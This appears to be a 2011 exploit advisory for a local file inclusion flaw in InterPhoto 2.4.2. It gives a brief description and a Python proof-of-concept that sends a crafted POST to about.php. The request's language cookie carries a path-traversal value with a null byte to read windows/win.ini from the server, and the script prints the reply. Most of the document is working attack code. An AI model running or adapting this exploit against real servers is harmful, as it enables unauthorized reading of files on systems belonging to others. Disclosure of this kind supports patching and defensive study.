# ------------------------------------------------------------------------
# Software................InterPhoto 2.4.2
# Vulnerability...........Local File Inclusion
# Threat Level............Critical (4/5)
# Download................http://www.weensoft.com/
# Release Date............3/4/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ........................Bryce Darling <bryce@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A local file inclusion vulnerability in InterPhoto 2.4.2 can be
# exploited to include arbitrary files.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/interphoto'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

s.send('POST ' + path + '/about.php HTTP/1.1\r\n'
    'Host: localhost\r\n'
    'Connection: keep-alive\r\n'
    'User-Agent: x\r\n'
    'Content-Length: 0\r\n'
    'Cache-Control: max-age=0\r\n'
    'Origin: null\r\n'
    'Content-Type: multipart/form-data; boundary=----x\r\n'
    'Cookie: IPLANGV6O1or24t6cI=' + '..%2f' * 8 + 'windows%2fwin.ini%00\r\n'
    'Accept: text/html\r\n'
    'Accept-Language: en-US,en;q=0.8\r\n'
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
    '\r\n')

print s.recv(8192)